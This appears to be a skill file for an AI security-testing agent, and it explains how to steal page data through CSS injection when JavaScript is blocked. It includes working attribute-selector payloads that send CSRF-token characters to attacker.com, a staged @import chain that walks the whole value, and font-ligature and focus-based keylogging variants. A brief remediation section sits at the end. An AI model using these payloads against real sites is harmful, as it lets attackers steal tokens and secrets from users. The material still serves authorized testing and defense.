---
name: css-injection-exfiltration
description: "Steal data with CSS alone when JS is blocked (strict CSP, sanitized HTML that still allows style). Use attribute selectors + sequential imports to exfiltrate CSRF tokens, secrets, and HTML character-by-character, plus font-based and timing variants. Complements dangling-markup-injection."
domain: client-side
source: unified-research-2025
---

# css-injection-exfiltration

> When you can inject CSS (a `<style>` block or a `style=` context) but **not** JavaScript — e.g. strict CSP with no script, or an HTML sanitizer that strips scripts but keeps styles — CSS is a data-exfiltration primitive. Pairs with `dangling-markup-injection`.

## 1. When to load
- Injection point lands inside/next to a `<style>` tag, or a sanitizer (DOMPurify config, email HTML) permits `style`.
- CSP blocks `script-src` but allows `style-src 'unsafe-inline'` or your injected stylesheet.
- You need to read a value on the page you cannot see (CSRF token, API key in an input, auth code).

## 2. Core primitive: attribute-selector oracle
CSS attribute selectors can match prefixes of an attribute value and trigger a network request on match:
```html
<style>
input[name="csrf"][value^="a"]{ background:url(https://attacker.com/leak?c=a); }
input[name="csrf"][value^="b"]{ background:url(https://attacker.com/leak?c=b); }
/* ... one rule per possible first character ... */
</style>
```
The browser only fetches the URL for the rule that matches → attacker learns the first character. Then target `value^="a?"` for the next char, and so on.

## 3. Leak a value in one shot: sequential @import
Instead of one char per page load, use a server that feeds new CSS via `@import` to walk the whole value without reloading:
```css
@import url(https://attacker.com/stage1.css);
/* stage1 returns rules for char 1, and @imports stage2, which depends on the leaked char 1, etc. */
```
Tooling: **CSS Exfil / `css-injection` PoC servers** automate the staged import chain and reconstruct the string. This reliably steals full CSRF tokens.

## 4. Reading hidden / non-input text
- Attribute selectors only read *attributes*. To leak text content, combine with:
  - `::before{content: attr(data-secret)}` tricks where the secret is in an attribute.
  - **Font ligature + `unicode-range` + scrollbar oracle**: custom `@font-face` with ligatures makes an element wider only if specific text is present; detect via `overflow`/scrollbar and a background-url on the scrollable element.
- Steal **any** attribute: `href`, `value`, `data-*`, token fields, even partial innerHTML via injected markup.

## 5. Other CSS-only impacts
- **Keylogger-ish**: `input:focus` + value-prefix rules capture typed one-time values.
- **Clickjacking/UI redress** via injected positioning/opacity.
- **CSP bypass data exfil** where `img-src`/`style-src` is laxer than `connect-src`.

## 6. Fix guidance (report)
- Sanitizer should strip `<style>` and `style=` or disallow `url()`/`@import`.
- CSP: restrict `style-src` (avoid `unsafe-inline`), set `img-src`/`font-src` tightly.
- Don't put secrets (CSRF tokens) in attributes selectable by injected CSS; rotate per-request.

## 7. Related skills
`dangling-markup-injection`, `xss`, `clickjacking`, `doubleclickjacking`.
